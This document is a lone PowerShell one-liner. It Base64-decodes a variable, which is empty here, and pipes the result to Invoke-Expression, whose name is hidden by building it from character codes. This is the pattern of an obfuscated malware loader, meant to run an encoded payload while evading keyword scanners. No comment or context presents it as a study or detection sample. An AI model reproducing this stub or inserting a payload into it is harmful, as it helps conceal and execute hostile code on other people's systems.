$QYRDHP="";$ULFPCCH=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($QYRDHP));$ULFPCCH|&([char]73+[char]69+[char]120)